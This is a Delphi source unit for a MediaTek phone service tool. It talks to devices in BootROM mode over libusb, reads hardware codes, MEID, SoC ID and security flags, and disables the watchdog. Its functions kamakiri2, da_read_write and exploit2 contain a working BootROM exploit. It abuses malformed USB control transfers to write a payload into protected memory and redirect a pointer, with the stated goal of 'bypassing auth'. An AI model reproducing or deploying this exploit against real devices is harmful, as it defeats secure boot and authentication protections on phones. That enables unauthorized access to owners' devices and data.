
unit preloader;

interface
uses Mediatek,comport_hwd,MainForm,Vcl.Graphics,SysUtils, libusb,Variants,Classes;
type
  TPreloader = class
     type
  WatchdogAddress = record
    wdt: uint32;
    addr: uint32;
  end;
  public
  function read_hw_codes(var info:MTKIn): boolean;
  function get_blver(var info:MTKIn):boolean;
  function get_hw_sw_ver(var info:MTKIn):boolean;
  function get_meid(var info:MTKIn):boolean;
  function get_socid(var info:MTKIn):boolean;
  function get_target_config(var info:MTKIn):boolean;
  function setreg_disablewatchdogtimer(var info:MTKIn):boolean;
  function exploit2(var info:MTKIn):boolean;

  function get_watchdog_addr(var info:MTKIn):WatchdogAddress;

  function mtk_read(addr: uint32; dowrds: uint32; mlength: uint32; data :array of byte):boolean;

  function reg_write(addr: uint32; values: uint32):boolean;

  function da_write(var info:MTKIn; addr:uint32; mlength:uint32;data :array of byte;check_result:boolean = true):boolean;
  function da_read(var info:MTKIn; addr:uint32; mlength:uint32;check_result:boolean = true):boolean;
  function da_read_write(var info:MTKIn; addr:uint32; mlength:uint32; data :array of byte;check_result:boolean = true):boolean;

  function brom_register_access(var info:MTKIn; addr:uint32; mlength:uint32;data :array of byte;check_result:boolean = true):boolean;

  function ctrl_transfer(req_type: Byte; req: Byte; val: uint16; idx: uint16; buff: array of byte):boolean;

  function kamakiri2(var info:MTKIn;addr:uint32):boolean;

  end;
type
  TCmd = (
    READ16 = $D0,
    READ32 = $D1,
    WRITE16 = $D2,
    WRITE32 = $D4,

    JUMP_DA = $D5,
    SEND_DA = $D7,

    GET_TARGET_CONFIG = $D8,

    brom_register_access = $DA,

    GET_ME_ID = $E1,
    GET_SOC_ID = $E7,

    GET_HW_SW_VER = $FC,
    GET_HW_CODE = $FD,
    GET_BL_VER = $FE,

    MAGIC = $FEEEEEEF,
    SYNC_SIGNAL = $434E5953,

    DOWNLOAD = $010001,
    UPLOAD = $010002,

    READ_DATA = $010005,
    FORMAT_PARTITION = $010006,
    SHUTDOWN = $010007,
    BOOT_TO = $010008,
    DEVICE_CTRL = $010009,
    INIT_EXT_RAM = $01000A,
    SETUP_ENVIRONMENT = $010100,
    SETUP_HW_INIT_PARAMS = $010101,

    SET_BATTERY_OPT = $020002,
    SET_CHECKSUM_LEVEL = $020003,
    SET_RESET_KEY = $020004,

    GET_EMMC_INFO = $040001,
    GET_NAND_INFO = $040002,
    GET_NOR_INFO = $040003,
    GET_UFS_INFO = $040004,
    GET_DA_VERSION = $040005,
    GET_EXPIRE_DATA = $040006,
    GET_PACKET_LENGTH = $040007,
    GET_CONNECTION_AGENT = $04000A,
    GET_RAM_INFO = $04000C,
    GET_CHIP_ID = $04000D,

    START_DL_INFO = $080001,
    END_DL_INFO = $080002
  );

implementation
uses devicehandler,rhelper;

function TPreloader.ctrl_transfer(req_type: Byte; req: Byte; val: uint16; idx: uint16; buff: array of byte): Boolean;
var
    hnd : pusb_dev_handle;
    bus : pusb_bus;
    dev: pusb_device;
    ret : longword;
begin
    hnd:=nil;
    usb_init;

    usb_find_busses;
    usb_find_devices;
    bus := usb_get_busses;

    while Assigned(bus) do
    begin
        dev := bus.devices;
        while Assigned(dev) do
        begin
            if (dev.descriptor.idVendor = $e8d) and (dev.descriptor.idProduct = $3) then
            begin
               hnd := usb_open(dev);
            end;

        dev := dev^.next;
        end;
        bus := bus^.next;
    end;

    if not Assigned(hnd) then
        exit(false);

    ret := usb_control_msg(hnd, req_type, req, val, idx, buff, length(buff), $00000000);
    if ret <> length(buff) then
        exit(false);

    usb_release_interface(hnd, $0);

    if usb_close(hnd) <> 0 then
        exit(false);
    result:= true;
end;

function TPreloader.kamakiri2(var info: MTKIn; addr: uint32): Boolean;
var
    linecode : array of uint32;
    reset : array of byte;
begin
    SetLength(linecode,3);
    linecode := [$00000000,$00000000,addr];

    if not ctrl_transfer($21, $20, $00, $00, CardinalsToBytes(linecode)) then
        exit(false);

    SetLength(reset,7);
    reset := [$00, $00, $00, $00, $00, $00, $00];
    if not ctrl_transfer($80, $06, $0200, $00, reset) then
        exit(false);
    result:=true;
end;
function TPreloader.exploit2(var info: MTKIn): Boolean;
var
    linecode: array of byte;
    ptr_send: uint32;
    tba: array[0..3] of Byte;
begin
    mform.adlg('Sending payload data...',clblack,true);
    Move(info.brom_payload_addr, tba, SizeOf(uint32));
    SetLength(linecode,7);
    linecode := [$00,$00,$00,$00,$00,$00,$00];
    if not ctrl_transfer($A1, $21, $00, $00, linecode) then
        raise Exception.Create('[EXPLOIT] failed to send ctrl transfer'+ sLineBreak+'Try to install libusb driver and try again');
    if not da_read(info, info.send_ptr[1], 4) then
        raise Exception.Create('[EXPLOIT] failed to read data');
    if not da_write(info, info.brom_payload_addr, length(info.payload), info.payload) then
        raise Exception.Create('[EXPLOIT] failed to write data');
    if not da_write(info, info.send_ptr[0], 4, tba) then
        raise Exception.Create('[EXPLOIT] failed to write data:0');
    mform.ok;
    mform.adlg('Bypassing auth...',clblack,true);
    if not mtk_read32(info.u32) then
        raise Exception.Create('[EXPLOIT] failed to read ACK response');
    if not info.u32 = $a1a2a3a4 then
        raise Exception.Create('[EXPLOIT] failed to bypass auth');
    mform.ok;
    result:= true;
end;
function TPreloader.da_read_write(var info: MTKIn; addr: uint32; mlength: uint32; data: array of Byte; check_result: Boolean): Boolean;
var
    ptr_da: uint32;
    i : integer;
begin
    if not mtk_read16(info.u16) then
        exit(false);
    if not mtk_read8(info.u8) then
        exit(false);
    if not brom_register_access(info, 0, 1, []) then
        exit(false);
    if not mtk_read(info.watchdog + $50, 1, 32, []) then
        exit(false);
    ptr_da := info.brom_register_access[1];
    for I := 0 to 2 do
        if not kamakiri2(info,ptr_da + 8 - 3 + i) then
            exit(false);
    if addr < $40 then
    begin
        for I := 0 to 3 do
            if not kamakiri2(info,ptr_da - 6 + (4 + i)) then
                exit(false);
        result:= brom_register_access(info,addr,mlength,data,check_result);
    end
    else
    begin
       for I := 0 to 2 do
            if not kamakiri2(info,ptr_da - 5 + (3 - i)) then
                exit(false);
        result:= brom_register_access(info,addr - $40 ,mlength,data,check_result);
    end;
    result:=true;
end;

function TPreloader.da_read(var info: MTKIn; addr: uint32; mlength: uint32; check_result: Boolean): Boolean;
begin
    result := da_read_write(info, addr, mlength, [], check_result);
end;
function TPreloader.da_write(var info: MTKIn; addr: uint32; mlength: uint32; data: array of Byte; check_result: Boolean = True): Boolean;
begin
    result := da_read_write(info, addr, mlength, data, check_result);
end;

function TPreloader.brom_register_access(var info: MTKIn; addr: uint32; mlength: uint32; data: array of Byte; check_result: Boolean): Boolean;
var
    mode : integer;
begin
    if not mtk_echo8(Byte(TCmd.brom_register_access)) then
        exit(false);
    if length(data) = 0 then mode := 0 else mode := 1;
    if not mtk_echo32(mode) then
        exit(false);
    if not mtk_echo32(addr) then
        exit(false);
    if not mtk_echo32(mlength) then
        exit(false);
    if not mtk_read16(info.u16) then
        exit(false);
    if not info.u16 = 0 then
    begin
        if info.u16 = $1a1d then
            exit(false);
        exit(false);
    end;
    if mode = 0 then
    begin
        if not mtk_read8(info.u8) then exit(false);
    end
    else
    begin
        if not mtk_writeData(data,length(data)) then exit(false);
    end;
    if check_result then if not mtk_read16(info.u16) then exit(false);
    result:=true;
end;
function TPreloader.get_watchdog_addr(var info: MTKIn): WatchdogAddress;
begin
  Result.wdt := info.watchdog;

  if Result.wdt <> 0 then
  begin
    case Result.wdt of
      $10007000:
        Result.addr := $22000064;
      $10212000:
        Result.addr := $22000000;
      $10211000:
        Result.addr := $22000064;
      $10007400:
        Result.addr := $22000000;
      $C0000000:
        Result.addr := $2264;
      $2200:
        begin
          case info.hwcode of
            $6276, $8163:
              Result.addr := $61000000;
            $6251, $6516:
              Result.addr := $80030000;
            $6255:
              Result.addr := $701E0000;
          else
            Result.addr := $70025000;
          end;
        end;
    else
      Result.addr := $22000064;
    end;
  end
  else
  begin
    Result.wdt := $00000000;
    Result.addr := $00000000;
  end;
end;
function TPreloader.setreg_disablewatchdogtimer(var info:MTKIn):boolean;
var
addrs:WatchdogAddress;
begin
    mform.adlg('Disabling WatchDogTimer...',clblack,true);
    addrs:= get_watchdog_addr(info);
    if (not reg_write(addrs.wdt,addrs.addr)) then
        raise Exception.Create('[PROTOCOL] faield to disable wdt');
    mform.ok;
    result:=true;
end;
function TPreloader.reg_write(addr: uint32; values: uint32):boolean;
var 
  u16:uint16;
begin
    if (not mtk_echo8(Byte(TCmd.WRITE32))) then
        exit(false);
    if (not mtk_echo32(uint32(addr))) then
        exit(false);
    if (not mtk_echo32(uint32($01))) then
        exit(false);
    if (not mtk_write32(values)) then
        exit(false);
    if (not mtk_read16(u16)) then
        exit(false);
    if (not mtk_read32(values)) then
        exit(false);
    if (not mtk_read16(u16)) then
        exit(false);
    result:=true;
end;

function TPreloader.read_hw_codes(var info:MTKIn): boolean;
var
   hwcode: uint16;
begin
  mform.adlg('Reading HW Info...',clblack,true);
  if not mtk_echo8(Byte(TCmd.GET_HW_CODE)) then
      raise Exception.Create('[PROTOCOL] failed to echo GET_HW_CODE');
  if not mtk_read16(hwcode) then
      raise Exception.Create('[PROTOCOL] failed to read response:0 GET_HW_CODE');
  if not mtk_read16(info.u16) then
      raise Exception.Create('[PROTOCOL] failed to read response:1 GET_HW_CODE');
  mform.ok;
  info.hwcode :=  Swap16(hwcode);
  mform.adlg('HW code : ',clblack,true);
  mform.adlg('0x'+IntToHex(info.hwcode),clblue,false);
  result:= true;
end;

function TPreloader.get_blver(var info: MTKIn):boolean;
begin
  mform.adlg('Connecting BROM...',clblack,true);
  if not mtk_echo8(Byte(Tcmd.GET_BL_VER)) then
      raise Exception.Create('[PROTOCOL] Can not read BL ver');
  mform.ok;
  result:= true;
end;

function TPreloader.get_hw_sw_ver(var info: MTKIn):boolean;
var
   hwsubcode,
   hwver,
   swver: uint16;
begin
  mform.adlg('Getting target info...',clblack,true);
  if not mtk_echo8(Byte(Tcmd.GET_HW_SW_VER)) then
      raise Exception.Create('[PROTOCOL] Can not read HW SW info');
  if not mtk_read16(hwsubcode) then
      raise Exception.Create('[PROTOCOL] Can not read hwsubcode info');
  if not mtk_read16(hwver) then
      raise Exception.Create('[PROTOCOL] Can not read hwver info');
  if not mtk_read16(swver) then
      raise Exception.Create('[PROTOCOL] Can not read swver info');
  if not mtk_read16(info.u16) then
      raise Exception.Create('[PROTOCOL] Can not read rev info');

  mform.ok;
  mform.adlg('HW subcode : ',clblack,true);
  mform.adlg('0x'+IntToHex(hwsubcode),clblue,false);
  mform.adlg(' HW ver : ',clblack,false);
  mform.adlg('0x'+IntToHex(hwver),clblue,false);
  mform.adlg(' SW ver : ',clblack,false);
  mform.adlg('0x'+IntToHex(swver),clblue,false);

  result:=true;
end;

function TPreloader.get_meid(var info: MTKIn):boolean;
var
   meid: array[0..15] of Byte;
begin
  if not mtk_echo8(Byte(Tcmd.GET_ME_ID)) then
      raise Exception.Create('[PROTOCOL] Can not echo GET_ME_ID');
  if not mtk_read32(info.u32) then
      raise Exception.Create('[PROTOCOL] Can not read MEID info:0');
  if not mtk_readdata(meid,16) then
      raise Exception.Create('[PROTOCOL] Can not read MEID info');
  if not mtk_read16(info.u16) then
      raise Exception.Create('[PROTOCOL] Can not read MEID info:1');
  mform.adlg('MEID : ',clblack,true);
  mform.adlg(BytesToHex(meid),clblue,false);
  result := true;
end;

function TPreloader.get_socid(var info: MTKIn):boolean;
var
   socid: array[0..31] of Byte;
begin
if not mtk_echo8(Byte(Tcmd.GET_SOC_ID)) then
      raise Exception.Create('[PROTOCOL] Can not echo GET_SOC_ID');
  if not mtk_read32(info.u32) then
      raise Exception.Create('[PROTOCOL] Can not read SOCID info:0');
  if not mtk_readdata(socid,32) then
      raise Exception.Create('[PROTOCOL] Can not read SOCID info');
  if not mtk_read16(info.u16) then
      raise Exception.Create('[PROTOCOL] Can not read SOCID info:1');
  mform.adlg('SOCID : ',clblack,true);
  mform.adlg(BytesToHex(socid),clblue,false);
  result := true;
end;


function TPreloader.get_target_config(var info: MTKIn): boolean;
begin
  mform.adlg('Reading sec values...',clblack,true);
  if not mtk_echo8(Byte(Tcmd.GET_TARGET_CONFIG)) then
      raise Exception.Create('[PROTOCOL] Can not read Target Info');
  if not mtk_read32(info.u32) then
      raise Exception.Create('[PROTOCOL] Unable to get response from device');
  if not mtk_read16(info.u16) then
      raise Exception.Create('[PROTOCOL] Unable to get response:0 from device');

  mform.ok;

  info.u32 := swap32(info.u32);
  mform.adlg('SBC: ',clblack,true); if (info.u32 and $01) <> 0 then mform.adlg('True',clblue,false) else mform.adlg('False',clblue,false);
  mform.adlg(' SLA : ',clblack,false); if (info.u32 and $02) <> 0 then mform.adlg('True',clblue,false) else mform.adlg('False',clblue,false);
  mform.adlg(' DAA : ',clblack,false); if (info.u32 and $04) <> 0 then mform.adlg('True',clblue,false) else mform.adlg('False',clblue,false);
  result := true;
end;




function TPreloader.mtk_read(addr: uint32; dowrds: uint32; mlength: uint32; data: array of Byte): Boolean;
var
  cmd:TCmd;
  u16: uint16;
  u32: uint32;
begin
    if mlength = 32 then cmd:= TCmd.Read32 else cmd:= TCmd.READ16;
    if not mtk_echo8(Byte(cmd)) then
        exit(false);
    if cmd = TCmd.Read32 then
    begin
        if not mtk_echo32(addr) then
            exit(false);
        if not mtk_echo32(dowrds) then
            exit(false);
        if not mtk_read16(u16) then
            exit(false);
        if not mtk_read32(u32) then
            exit(false);
        if not mtk_read16(u16) then
            exit(false);
    end
    else
    begin
        if not mtk_echo8(addr) then
            exit(false);
        if not mtk_echo8(dowrds) then
            exit(false);
    end;
    result:=true;
end;


end.
